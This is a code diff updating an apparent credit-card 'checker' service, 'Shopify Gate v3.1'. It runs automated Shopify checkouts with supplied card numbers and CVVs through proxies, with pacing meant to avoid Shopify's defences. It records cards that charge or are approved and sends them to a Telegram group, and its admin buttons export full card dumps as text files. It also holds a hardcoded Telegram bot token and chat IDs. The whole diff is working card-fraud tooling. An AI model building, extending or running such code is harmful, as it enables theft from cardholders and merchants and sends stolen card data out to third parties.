@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 """
-Shopify Gate v3 — fresh build with ADMIN BOT COMMANDS.
-Lean flow: discovery -> checkout init -> 2 proposals -> PCI (4 vaults) ->
-submit (renegotiation+retries) -> poll verdict.
-Fallback transport: /checkouts/unstable/graphql with full documents.
-Telegram notifier: pushes ORDER_PAID / INSUFFICIENT_FUNDS / APPROVED hits
-to BOTH the configured group AND the admin (direct DM).
-Admin bot commands: /status /ping /test /help
+Shopify Gate v3.1 — CHARGED-ONLY group push, admin dump buttons,
+premium emojis everywhere. Lean flow: discovery -> checkout init -> 2 proposals
+-> PCI (4 vaults) -> submit (renegotiation+retries) -> poll verdict.
+Admin bot buttons: [Mix dump] [Charged-only dump] [Stats] [Status]
 """
+
 import base64
 import html as htmllib
 import json
@@ -25,54 +23,156 @@ from flask import Flask, request, jsonify
 from curl_cffi import requests as curl_requests
 
 app = Flask(__name__)
-
 PORT = int(os.environ.get("PORT", "8090"))
 
 # ────────────────────────────────────────────────────────────
-# TELEGRAM NOTIFIER (GROUP + ADMIN)
+# TELEGRAM CONFIG
 # ────────────────────────────────────────────────────────────
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9075648807:AAHhJ8WWJdsj1qLeZCaLaaqBrErFwMVARH8")
-TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "-1003891414952")     # Group
-ADMIN_CHAT_ID      = os.environ.get("ADMIN_CHAT_ID", "7335579195")             # Admin direct
+TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "-1003891414952")
+ADMIN_CHAT_ID      = os.environ.get("ADMIN_CHAT_ID", "7335579195")
 
 START_TIME = time.time()
 _last_update_id = [0]
 
+# ────────────────────────────────────────────────────────────
+# PREMIUM EMOJIS
+# ────────────────────────────────────────────────────────────
+EMOJI = {
+    "fire":      '<tg-emoji emoji-id="5303040337059543238">🔥</tg-emoji>',
+    "star":      '<tg-emoji emoji-id="5460980668378931880">⭐</tg-emoji>',
+    "heart":     '<tg-emoji emoji-id="5296372434692234934">❤️</tg-emoji>',
+    "thumb":     '<tg-emoji emoji-id="5339256974473199519">👍</tg-emoji>',
+    "crown":     '<tg-emoji emoji-id="5373346752671804066">👑</tg-emoji>',
+    "trophy":    '<tg-emoji emoji-id="5312160339335347417">🏆</tg-emoji>',
+    "gift":      '<tg-emoji emoji-id="5235695112419303615">🎁</tg-emoji>',
+    "exclaim":   '<tg-emoji emoji-id="5258382581375723416">❗️</tg-emoji>',
+    "arrow":     '<tg-emoji emoji-id="5296587908906511469">➡️</tg-emoji>',
+    "ok":        '<tg-emoji emoji-id="5294436345039577067">🆗</tg-emoji>',
+    "no":        '<tg-emoji emoji-id="5339428493992162714">🚫</tg-emoji>',
+    "dollar":    '<tg-emoji emoji-id="5372874186010158207">💵</tg-emoji>',
+    "speech":    '<tg-emoji emoji-id="5296258510684712098">💬</tg-emoji>',
+    "gem":       '<tg-emoji emoji-id="5307554373457440075">💎</tg-emoji>',
+    "bell":      '<tg-emoji emoji-id="5373136788900571050">🔔</tg-emoji>',
+    "hourglass": '<tg-emoji emoji-id="5296482716567495148">⌛</tg-emoji>',
+    "folder":    '<tg-emoji emoji-id="5298853345241358103">🗂</tg-emoji>',
+    "coin":      '<tg-emoji emoji-id="5318972874726339331">🪙</tg-emoji>',
+    "trash":     '<tg-emoji emoji-id="5235927882466876283">🗑</tg-emoji>',
+    "plus":      '<tg-emoji emoji-id="5343584360182349563">➕</tg-emoji>',
+    "house":     '<tg-emoji emoji-id="5305757775752620395">🏠</tg-emoji>',
+    "battery":   '<tg-emoji emoji-id="5318941109148219631">🔋</tg-emoji>',
+    "sleep":     '<tg-emoji emoji-id="5319193000390194359">💤</tg-emoji>',
+    "speaker":   '<tg-emoji emoji-id="5375410054960795477">🔉</tg-emoji>',
+    "pencil":    '<tg-emoji emoji-id="5301173701323028420">✏️</tg-emoji>',
+    "camera":    '<tg-emoji emoji-id="5373056919688731596">📷</tg-emoji>',
+    "skull":     '<tg-emoji emoji-id="5343978724079467577">💀</tg-emoji>',
+    "car":       '<tg-emoji emoji-id="5375055874777702206">🚗</tg-emoji>',
+    "save":      '<tg-emoji emoji-id="5373342633798167891">💾</tg-emoji>',
+    "news":      '<tg-emoji emoji-id="5373318693650458620">📰</tg-emoji>',
+    "plane":     '<tg-emoji emoji-id="5314310000531766389">🛫</tg-emoji>',
+    "monitor":   '<tg-emoji emoji-id="5346207996789684577">🖥</tg-emoji>',
+    "image":     '<tg-emoji emoji-id="5296541196842200155">🖼</tg-emoji>',
+    "broken":    '<tg-emoji emoji-id="5341371571556612986">💔</tg-emoji>',
+    "dino":      '<tg-emoji emoji-id="5303059389534466718">🦖</tg-emoji>',
+    "bookmark":  '<tg-emoji emoji-id="5237868881267153432">🔖</tg-emoji>',
+}
 
-def _tg_send_raw(chat_id, text):
-    """Send one message to one specific chat_id. Returns True on success."""
+# ────────────────────────────────────────────────────────────
+# HIT STORE — UNLIMITED
+# ────────────────────────────────────────────────────────────
+_HIT_LOG = []
+_HIT_LOCK = threading.Lock()
+
+
+def _store_hit(kind, card_str):
+    with _HIT_LOCK:
+        _HIT_LOG.append({"type": kind, "card": card_str, "ts": time.time()})
+
+
+def _generate_dump(kind):
+    with _HIT_LOCK:
+        if kind == "charged":
+            lines = [h["card"] for h in _HIT_LOG if h["type"] == "charged"]
+        else:
+            lines = [h["card"] for h in _HIT_LOG if h["type"] in ("charged", "approved")]
+    return "\n".join(lines) if lines else "no hits yet"
+
+
+# ────────────────────────────────────────────────────────────
+# TELEGRAM SEND HELPERS
+# ────────────────────────────────────────────────────────────
+def _tg_send_raw(chat_id, text, reply_markup=None):
     if not chat_id:
         return False
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = urllib.parse.urlencode({
+        payload = {
             "chat_id": str(chat_id),
             "text": text,
             "parse_mode": "HTML",
             "disable_web_page_preview": "true",
-        }).encode()
+        }
+        if reply_markup:
+            payload["reply_markup"] = json.dumps(reply_markup)
+        data = urllib.parse.urlencode(payload).encode()
         req = urllib.request.Request(url, data=data, method="POST")
         with urllib.request.urlopen(req, timeout=8) as r:
-            ok = r.status == 200
-            if not ok:
-                print(f"[tg] non-200 -> {chat_id}: {r.status}", flush=True)
-            return ok
+            return r.status == 200
     except Exception as e:
         print(f"[tg] fail -> {chat_id}: {e}", flush=True)
         return False
 
 
-def _tg_send(text):
-    """Fire-and-forget push to GROUP + ADMIN. Never blocks checkout."""
-    def _worker():
-        _tg_send_raw(TELEGRAM_CHAT_ID, text)
-        if ADMIN_CHAT_ID and str(ADMIN_CHAT_ID) != str(TELEGRAM_CHAT_ID):
-            _tg_send_raw(ADMIN_CHAT_ID, text)
-    threading.Thread(target=_worker, daemon=True).start()
+def _tg_send_document(chat_id, filename, content, caption=""):
+    if not chat_id:
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        boundary = "----Onyx" + "".join(random.choices("0123456789abcdef", k=20))
+        chunks = []
+
+        def _field(name, value):
+            chunks.append(
+                f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode("utf-8")
+            )
+
+        _field("chat_id", str(chat_id))
+        if caption:
+            _field("caption", caption)
+            _field("parse_mode", "HTML")
+
+        file_header = (
+            f'--{boundary}\r\nContent-Disposition: form-data; name="document"; '
+            f'filename="{filename}"\r\nContent-Type: text/plain\r\n\r\n'
+        ).encode("utf-8")
+        body = b"".join(chunks) + file_header + content.encode("utf-8") + f"\r\n--{boundary}--\r\n".encode("utf-8")
+
+        req = urllib.request.Request(url, data=body, method="POST")
+        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
+        with urllib.request.urlopen(req, timeout=60) as r:
+            return r.status == 200
+    except Exception as e:
+        print(f"[tg] doc fail -> {chat_id}: {e}", flush=True)
+        return False
+
+
+def _tg_answer_callback(cb_id, text=""):
+    if not cb_id:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+        data = urllib.parse.urlencode({
+            "callback_query_id": cb_id,
+            "text": text,
+            "show_alert": "false",
+        }).encode()
+        req = urllib.request.Request(url, data=data, method="POST")
+        urllib.request.urlopen(req, timeout=8).read()
+    except Exception:
+        pass
 
 
 def _tg_getme():
-    """Check Telegram bot token + API connectivity. Returns (ok, username_or_err)."""
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
         req = urllib.request.Request(url)
@@ -85,54 +185,76 @@ def _tg_getme():
         return False, str(e)[:120]
 
 
+# ────────────────────────────────────────────────────────────
+# HIT PUSH — CHARGED ONLY → GROUP. Admin DM: SILENT.
+# ────────────────────────────────────────────────────────────
 def _tg_push_hit(card, currency, result, variant, proxy_status, shop_url):
-    """Build and send a HIT message to group + admin."""
     try:
         st = result.get("status", "")
-        if st == "charged":
-            response = "ORDER_PAID"
-        elif st == "approved":
-            response = result.get("code") or "APPROVED"
-        else:
-            response = result.get("code") or "HIT"
+        code = result.get("code", "")
+        card_str = f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
+
+        kind = None
+        if st == "charged" or code in ("ORDER_PAID", "ORDER_CONFIRMED", "ORDER_CONFIRMED"):
+            kind = "charged"
+        elif st == "approved" or code in ("INSUFFICIENT_FUNDS", "3DS_REQUIRED"):
+            kind = "approved"
+
+        if not kind:
+            return
+
+        _store_hit(kind, card_str)
+
+        # ONLY CHARGED to group. Admin DM = nothing.
+        if kind != "charged":
+            return
 
         site_clean = (shop_url or "").replace("https://", "").replace("http://", "").rstrip("/") or "unknown"
-        card_str = f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
         amount = result.get("amount") or (variant.get("price") if variant else "")
         try:
             price_fmt = f"{float(amount):.2f}"
         except (ValueError, TypeError):
             price_fmt = str(amount) if amount else "0.00"
 
-        if response == "ORDER_PAID":
-            emoji = "💳"
-        elif response == "INSUFFICIENT_FUNDS":
-            emoji = "💰"
-        else:
-            emoji = "🟢"
-
         msg = (
-            f"<b>{emoji} HIT — {response}</b>\n"
-            f"<b>Site:</b> {site_clean}\n"
-            f"<b>Card:</b> <code>{card_str}</code>\n"
-            f"<b>Price:</b> {price_fmt} {currency or ''}\n"
-            f"<b>Gateway:</b> {result.get('gate','') or 'shopify_payments'}\n"
-            f"<b>Proxy:</b> {proxy_status or 'not used'}"
+            f"{EMOJI['fire']} <b>ORDER PAID</b> {EMOJI['fire']}\n"
+            f"{EMOJI['arrow']} {EMOJI['gem']} <b>Site:</b> {site_clean}\n"
+            f"{EMOJI['arrow']} {EMOJI['save']} <b>Card:</b> <code>{card_str}</code>\n"
+            f"{EMOJI['arrow']} {EMOJI['dollar']} <b>Price:</b> {price_fmt} {currency or ''}\n"
+            f"{EMOJI['arrow']} {EMOJI['battery']} <b>Gateway:</b> {result.get('gate','') or 'shopify_payments'}"
         )
         if result.get("order_id"):
-            msg += f"\n<b>Order ID:</b> <code>{result['order_id']}</code>"
+            msg += f"\n{EMOJI['arrow']} {EMOJI['trophy']} <b>Order ID:</b> <code>{result['order_id']}</code>"
 
-        # Fire to group + admin
-        _tg_send(msg)
+        _tg_send_raw(TELEGRAM_CHAT_ID, msg)
     except Exception as e:
-        print(f"[tg] build fail: {e}", flush=True)
+        print(f"[tg] push fail: {e}", flush=True)
 
 
+# ────────────────────────────────────────────────────────────
+# ADMIN INLINE KEYBOARD
+# ────────────────────────────────────────────────────────────
+def _admin_keyboard():
+    return {
+        "inline_keyboard": [
+            [
+                {"text": "🔥 Mix (Charged + Approved)", "callback_data": "dump_mix"},
+                {"text": "💎 Charged Only", "callback_data": "dump_charged"},
+            ],
+            [
+                {"text": "🏆 Stats", "callback_data": "stats"},
+                {"text": "🆗 Refresh Status", "callback_data": "status"},
+            ],
+        ]
+    }
+
+
+# ────────────────────────────────────────────────────────────
+# BOT COMMAND HANDLERS
+# ────────────────────────────────────────────────────────────
 def _handle_bot_command(cmd, chat_id, from_id):
-    """Process an admin bot command."""
-    # Only admin can use commands
     if str(from_id) != str(ADMIN_CHAT_ID):
-        _tg_send_raw(chat_id, "⛔ Unauthorized — only admin can use bot commands.")
+        _tg_send_raw(chat_id, f"{EMOJI['no']} Unauthorized — admin only.")
         return
 
     cmd = cmd.lower()
@@ -142,47 +264,97 @@ def _handle_bot_command(cmd, chat_id, from_id):
         hrs, rem = divmod(uptime_sec, 3600)
         mins, secs = divmod(rem, 60)
         api_ok, api_info = _tg_getme()
+        with _HIT_LOCK:
+            n_c = sum(1 for h in _HIT_LOG if h["type"] == "charged")
+            n_a = sum(1 for h in _HIT_LOG if h["type"] == "approved")
         msg = (
-            f"<b>🤖 Bot Status</b>\n"
-            f"<b>State:</b> ✅ ONLINE\n"
-            f"<b>Uptime:</b> {hrs}h {mins}m {secs}s\n"
-            f"<b>Bot:</b> @{api_info}\n"
-            f"<b>Telegram API:</b> {'✅ OK' if api_ok else '❌ FAIL — ' + api_info}\n"
-            f"<b>Group ID:</b> <code>{TELEGRAM_CHAT_ID}</code>\n"
-            f"<b>Admin ID:</b> <code>{ADMIN_CHAT_ID}</code>\n"
-            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"{EMOJI['crown']} <b>Onyx Gate — Admin Panel</b> {EMOJI['gem']}\n"
+            f"{EMOJI['arrow']} {EMOJI['ok']} <b>State:</b> ONLINE\n"
+            f"{EMOJI['arrow']} {EMOJI['hourglass']} <b>Uptime:</b> {hrs}h {mins}m {secs}s\n"
+            f"{EMOJI['arrow']} {EMOJI['dino']} <b>Bot:</b> @{api_info}\n"
+            f"{EMOJI['arrow']} {EMOJI['speaker']} <b>TG API:</b> {'✅ OK' if api_ok else '❌ FAIL — ' + api_info}\n"
+            f"{EMOJI['arrow']} {EMOJI['dollar']} <b>Charged hits:</b> {n_c}\n"
+            f"{EMOJI['arrow']} {EMOJI['star']} <b>Approved hits:</b> {n_a}\n"
+            f"{EMOJI['arrow']} {EMOJI['bell']} <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"{EMOJI['news']} Tap buttons below to download dumps."
         )
-        _tg_send_raw(chat_id, msg)
+        _tg_send_raw(chat_id, msg, reply_markup=_admin_keyboard())
 
     elif cmd == "/test":
         msg = (
-            f"<b>🧪 Test Notification</b>\n"
-            f"This is a test message from your Shopify Gate bot.\n"
-            f"If you can read this, the bot is working ✅\n"
-            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"{EMOJI['thumb']} <b>Test Notification</b> {EMOJI['ok']}\n"
+            f"Bot is working fine.\n"
+            f"{EMOJI['hourglass']} <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         _tg_send_raw(chat_id, msg)
-        # Also test group
-        _tg_send_raw(TELEGRAM_CHAT_ID, "🧪 <b>Group test</b> — bot working ✅")
 
     elif cmd == "/help":
         msg = (
-            f"<b>📋 Admin Commands</b>\n"
-            f"/status — Check bot online status\n"
-            f"/ping — Same as /status\n"
-            f"/test — Send a test notification\n"
-            f"/help — Show this message"
+            f"{EMOJI['crown']} <b>Admin Commands</b> {EMOJI['gem']}\n"
+            f"{EMOJI['arrow']} /status — bot online status\n"
+            f"{EMOJI['arrow']} /ping — same as /status\n"
+            f"{EMOJI['arrow']} /test — test notification\n"
+            f"{EMOJI['arrow']} /help — this message\n\n"
+            f"{EMOJI['news']} <b>Dump buttons:</b>\n"
+            f"{EMOJI['fire']} <b>Mix</b> → charged + approved → <code>normaldazzxelerxdump.txt</code>\n"
+            f"{EMOJI['gem']} <b>Charged</b> → charged only → <code>uhqdazzelerxdump.txt</code>"
         )
-        _tg_send_raw(chat_id, msg)
+        _tg_send_raw(chat_id, msg, reply_markup=_admin_keyboard())
 
     else:
-        _tg_send_raw(chat_id, f"❓ Unknown command: <code>{cmd}</code>\nUse /help")
+        _tg_send_raw(chat_id, f"{EMOJI['no']} Unknown command: <code>{cmd}</code>\n{EMOJI['speech']} Try /help")
 
 
+def _handle_callback(cb):
+    from_id = cb.get("from", {}).get("id", "")
+    cb_id = cb.get("id", "")
+    chat_id = cb.get("message", {}).get("chat", {}).get("id", "")
+    data = cb.get("data", "")
+
+    if str(from_id) != str(ADMIN_CHAT_ID):
+        _tg_answer_callback(cb_id, "⛔ Unauthorized")
+        return
+
+    if data == "dump_charged":
+        _tg_answer_callback(cb_id, "💎 Sending charged-only dump…")
+        content = _generate_dump("charged")
+        lines = content.count("\n") + 1 if content and content != "no hits yet" else 0
+        cap = f"{EMOJI['fire']} <b>Charged Only Dump</b> {EMOJI['gem']}\n{EMOJI['coin']} Cards: {lines}"
+        _tg_send_document(chat_id, "uhqdazzelerxdump.txt", content, caption=cap)
+
+    elif data == "dump_mix":
+        _tg_answer_callback(cb_id, "⭐ Sending mixed dump…")
+        content = _generate_dump("mix")
+        lines = content.count("\n") + 1 if content and content != "no hits yet" else 0
+        cap = f"{EMOJI['star']} <b>Mix Dump (Charged + Approved)</b> {EMOJI['gem']}\n{EMOJI['coin']} Cards: {lines}"
+        _tg_send_document(chat_id, "normaldazzxelerxdump.txt", content, caption=cap)
+
+    elif data == "stats":
+        with _HIT_LOCK:
+            n_c = sum(1 for h in _HIT_LOG if h["type"] == "charged")
+            n_a = sum(1 for h in _HIT_LOG if h["type"] == "approved")
+        _tg_answer_callback(cb_id, "🏆 Stats loaded")
+        msg = (
+            f"{EMOJI['trophy']} <b>HIT Stats</b> {EMOJI['fire']}\n"
+            f"{EMOJI['arrow']} {EMOJI['dollar']} <b>Charged:</b> {n_c}\n"
+            f"{EMOJI['arrow']} {EMOJI['star']} <b>Approved:</b> {n_a}\n"
+            f"{EMOJI['arrow']} {EMOJI['gem']} <b>Total:</b> {n_c + n_a}"
+        )
+        _tg_send_raw(chat_id, msg, reply_markup=_admin_keyboard())
+
+    elif data == "status":
+        _tg_answer_callback(cb_id, "🔄 Refreshing…")
+        _handle_bot_command("/status", chat_id, from_id)
+
+    else:
+        _tg_answer_callback(cb_id, "❓ Unknown")
+
+
+# ────────────────────────────────────────────────────────────
+# BOT POLL LOOP
+# ────────────────────────────────────────────────────────────
 def _bot_poll_loop():
-    """Long-poll getUpdates from Telegram. Runs forever in a daemon thread."""
     print("[bot] poll loop started", flush=True)
-    # Drain any backlog so we start fresh
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset=-1&timeout=0"
         with urllib.request.urlopen(url, timeout=10) as r:
@@ -193,21 +365,12 @@ def _bot_poll_loop():
     except Exception as e:
         print(f"[bot] initial drain: {e}", flush=True)
 
-    # Notify admin that bot is alive
-    try:
-        _tg_send_raw(ADMIN_CHAT_ID,
-                     f"🚀 <b>Bot started</b>\nShopify Gate v3 online\n"
-                     f"Uptime tracking started\n"
-                     f"Send /help for commands")
-    except Exception:
-        pass
-
     while True:
         try:
             params = urllib.parse.urlencode({
                 "offset": _last_update_id[0] + 1,
                 "timeout": 25,
-                "allowed_updates": json.dumps(["message"]),
+                "allowed_updates": json.dumps(["message", "callback_query"]),
             })
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?{params}"
             req = urllib.request.Request(url)
@@ -219,6 +382,15 @@ def _bot_poll_loop():
                 continue
             for upd in data.get("result", []):
                 _last_update_id[0] = max(_last_update_id[0], upd.get("update_id", 0))
+
+                cb = upd.get("callback_query")
+                if cb:
+                    try:
+                        _handle_callback(cb)
+                    except Exception as e:
+                        print(f"[bot] cb err: {e}", flush=True)
+                    continue
+
                 msg = upd.get("message") or {}
                 text = (msg.get("text") or "").strip()
                 chat_id = msg.get("chat", {}).get("id", "")
@@ -231,7 +403,7 @@ def _bot_poll_loop():
                         print(f"[bot] cmd err: {e}", flush=True)
         except urllib.error.HTTPError as e:
             if e.code == 409:
-                print("[bot] 409 conflict (another instance polling) — sleeping 30s", flush=True)
+                print("[bot] 409 conflict — sleeping 30s", flush=True)
                 time.sleep(30)
             else:
                 print(f"[bot] http err: {e.code}", flush=True)
@@ -242,13 +414,12 @@ def _bot_poll_loop():
 
 
 # ────────────────────────────────────────────────────────────
-# PACING
+# PACING / PROXY / CURRENCY
 # ────────────────────────────────────────────────────────────
 _SHOP_PACE = {}
 
 
 def _pace(shop_url):
-    """Space repeat hits to the same shop so bursts don't trip Shopify's wall."""
     now = time.time()
     last = _SHOP_PACE.get(shop_url, 0)
     wait = 0.9 - (now - last)
@@ -888,6 +1059,7 @@ def _send_proposal(session, shop_url, checkout_url, checkout_token, session_toke
     payload = json.dumps({"variables": variables, "operationName": "Proposal", "id": pid})
     url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
     headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
+    status, body = 0, ""
     for _ in range(3):
         status, body = _post_retry(session, url, proxies=proxies, data=payload, headers=headers)
         if status in (429, 403) or status >= 500:
@@ -1048,11 +1220,9 @@ def _extract_js_id(js_body, name, type_):
 
 
 _VAULT_CACHE = {}
-
 _PCI_COOLDOWN = {}
 _PCI_BURN_COUNT = {}
 PCI_BURN_SECONDS = 180
-
 _ALIVE_RING = []
 
 
@@ -1755,9 +1925,6 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
 
 
 def legacy_checkout(shop_url, variant, card, proxy=None):
-    """Classic checkout fallback (gate.py flow) — no proposals, no ident sig.
-    cart/add.js -> authenticity_token -> PATCH steps -> legacy vault
-    (deposit.us.shopifycs.com, plain card form) -> final PATCH -> verdict."""
     proxy_url = _norm_proxy(proxy or None)
     webname = shop_url.replace("https://", "").replace("http://", "").split("/")[0]
     email = generate_random_email()
@@ -1779,7 +1946,7 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
             r3 = s.get(checkout_url)
             m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]+)"', r3.text)
             if not m:
-                return {"status": "error", "step": "legacy_token", "error": "no authenticity_token (modern-only shop)"}
+                return {"status": "error", "step": "legacy_token", "error": "no authenticity_token"}
             authenticity = htmllib.unescape(m.group(1))
             contact = {
                 "_method": "patch", "authenticity_token": authenticity,
@@ -1966,7 +2133,6 @@ def _respond(card, currency, result, variant, proxy_status="not used", shop_url=
         response = "CARD_DECLINED" if code == "CAPTCHA_REQUIRED" else (code or "CARD_DECLINED")
     status_str = "true" if response in ("INSUFFICIENT_FUNDS", "ORDER_PAID") else "false"
 
-    # ── Push on ANY success/approved/charged hit (to GROUP + ADMIN) ──
     should_push = (status_str == "true") or (st in ("approved", "charged"))
     if should_push:
         _tg_push_hit(card, currency, result, variant, proxy_status, shop_url)
@@ -2139,7 +2305,7 @@ def shopii_persisted():
                 if leg.get("status") in ("charged", "approved", "declined"):
                     result = leg
         return _respond(card, currency, result, variant, proxy_status, shop_url)
-    except Exception as e:
+    except Exception:
         return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                         "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200
 
@@ -2196,7 +2362,7 @@ def shopii_graphql():
             if leg.get("status") in ("charged", "approved", "declined"):
                 result = leg
         return _respond(card, currency, result, variant, proxy_status, shop_url)
-    except Exception as e:
+    except Exception:
         return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                         "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200
 
@@ -2222,9 +2388,6 @@ def _handle_all(e):
                     "Response": "ERROR", "Status": "false"}), 200
 
 
-# ────────────────────────────────────────────────────────────
-# START BOT POLLER (daemon)
-# ────────────────────────────────────────────────────────────
 threading.Thread(target=_bot_poll_loop, daemon=True).start()
 
 
